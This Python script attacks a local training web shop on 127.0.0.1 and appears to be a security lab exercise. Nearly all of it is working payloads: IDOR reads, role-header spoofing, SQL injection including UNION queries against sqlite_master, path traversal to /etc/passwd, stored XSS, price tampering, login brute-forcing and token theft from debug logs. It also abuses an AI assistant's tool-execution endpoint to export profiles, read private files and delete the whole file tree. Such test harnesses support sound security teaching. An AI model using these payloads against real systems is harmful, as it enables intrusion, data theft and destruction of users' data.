"""Attack script for the local Mini Shop only (127.0.0.1). Usage: attack.py PORT OUTFILE"""
import json
import sys
from urllib.error import HTTPError
from urllib.parse import quote
from urllib.request import Request, urlopen

BASE = f"http://127.0.0.1:{sys.argv[1]}"
OUT = sys.argv[2]
results = []


def call(method, path, body=None, headers=None):
    req = Request(BASE + path, data=json.dumps(body).encode() if body is not None else None,
                  headers={"Content-Type": "application/json", **(headers or {})}, method=method)
    try:
        resp = urlopen(req, timeout=5)
    except HTTPError as exc:
        resp = exc
    with resp:
        raw = resp.read().decode()
        return resp.status, raw


def attack(name, method, path, body=None, headers=None):
    status, raw = call(method, path, body, headers)
    results.append({"attack": name, "request": f"{method} {path}", "body": body, "status": status, "response": raw[:600]})
    print(f"[{status}] {name}: {raw[:140]!r}")
    return status, raw


def token(user, password):
    return json.loads(call("POST", "/login", {"username": user, "password": password})[1]).get("token")


alice = {"X-Token": token("alice", "learn-alice")}
attack("A01 anonymous profile read", "GET", "/profile?id=2")
attack("A01 IDOR: alice reads bob profile", "GET", "/profile?id=2", headers=alice)
attack("A01 anonymous orders (all users)", "GET", "/orders")
attack("A01 X-Role spoof (no session)", "GET", "/admin/export", headers={"X-Role": "staff"})
attack("A01 X-Role spoof (customer session)", "GET", "/admin/export", headers={**alice, "X-Role": "staff"})
attack("A03 SQLi OR 1=1 in /profile", "GET", "/profile?id=" + quote("1 OR 1=1"))
attack("A03 SQLi UNION (sqlite_master)", "GET", "/profile?id=" + quote("0 UNION SELECT 1,sql,name,type FROM sqlite_master"))
attack("A03 SQLi in /search", "GET", "/search?q=" + quote("' OR '1'='1"))
attack("A03 SQLi in assistant order_id", "GET", "/assistant/context?order_id=" + quote("1 OR 1=1"))
attack("A03 SQLi OR 1=1 in /profile (alice token)", "GET", "/profile?id=" + quote("1 OR 1=1"), headers=alice)
attack("A03 SQLi UNION sqlite_master (alice token)", "GET", "/profile?id=" + quote("0 UNION SELECT 1,sql,name,type FROM sqlite_master"), headers=alice)
attack("A03 SQLi in /search (alice token)", "GET", "/search?q=" + quote("' OR '1'='1"), headers=alice)
attack("A03 enumerate profiles via /search q=TEST (alice token)", "GET", "/search?q=TEST", headers=alice)
attack("A03 SQLi in assistant order_id (alice token)", "GET", "/assistant/context?order_id=" + quote("1 OR 1=1"), headers=alice)
attack("A01 alice lists orders", "GET", "/orders", headers=alice)
attack("Path traversal: private note (alice token)", "GET", "/files?user=" + quote("..") + "&path=" + quote("private/operator-note.txt"), headers=alice)
attack("IDOR: bob receipt (alice token)", "GET", "/files?user=bob&path=receipt.txt", headers=alice)
attack("Stored XSS payload saved (alice token)", "POST", "/reviews", {"product": "chair", "text": "<script>alert(document.domain)</script>"}, alice)
attack("Stored XSS rendered (after save)", "GET", "/reviews/view")
attack("Debug logs (alice token)", "GET", "/debug/logs", headers=alice)
attack("Assistant execute: export (alice token)", "POST", "/assistant/execute", {"decision": {"tool": "export_profiles", "arguments": {}}}, alice)
attack("A04 price tampering", "POST", "/orders", {"product": "chair", "price": 1}, alice)
attack("A04 negative price", "POST", "/orders", {"product": "chair", "price": -5000}, alice)
attack("Path traversal: private note", "GET", "/files?user=" + quote("..") + "&path=" + quote("private/operator-note.txt"))
attack("IDOR: bob receipt without login", "GET", "/files?user=bob&path=receipt.txt")
attack("Traversal ../bob via path", "GET", "/files?user=alice&path=" + quote("../bob/receipt.txt"), headers=alice)
attack("Path outside sandbox (error leak)", "GET", "/files?user=alice&path=" + quote("../../../../etc/passwd"), headers=alice)
attack("Stored XSS payload saved", "POST", "/reviews", {"product": "chair", "text": "<script>alert(document.domain)</script>"})
attack("Stored XSS rendered", "GET", "/reviews/view")
attack("Debug logs leak tokens/passwords", "GET", "/debug/logs")
attack("Error leak: malformed body", "POST", "/orders", {}, alice)
attack("Assistant execute: export without auth", "POST", "/assistant/execute", {"decision": {"tool": "export_profiles", "arguments": {}}})
attack("Assistant execute: read operator note", "POST", "/assistant/execute", {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}}, alice)
attack("Assistant execute: read bob receipt", "POST", "/assistant/execute", {"decision": {"tool": "read_file", "arguments": {"path": "files/bob/receipt.txt"}}}, alice)
attack("Assistant context: foreign order", "GET", "/assistant/context?order_id=2", headers=alice)
statuses = [call("POST", "/login", {"username": "alice", "password": f"guess{i}"})[0] for i in range(30)]
results.append({"attack": "Brute force login (30 tries)", "statuses": sorted(set(statuses))})
print("brute force statuses:", sorted(set(statuses)))
attack("Assistant execute: delete_tree files/bob", "POST", "/assistant/execute", {"decision": {"tool": "delete_tree", "arguments": {"path": "files/bob"}}}, alice)
attack("Bob receipt after delete", "GET", "/files?user=bob&path=receipt.txt")
attack("Assistant execute: delete_tree . (everything)", "POST", "/assistant/execute", {"decision": {"tool": "delete_tree", "arguments": {"path": "."}}}, alice)
attack("Health after wipe", "GET", "/health")
attack("Alice receipt after wipe", "GET", "/files?user=alice&path=receipt.txt", headers=alice)
json.dump(results, open(OUT, "w"), ensure_ascii=False, indent=1)
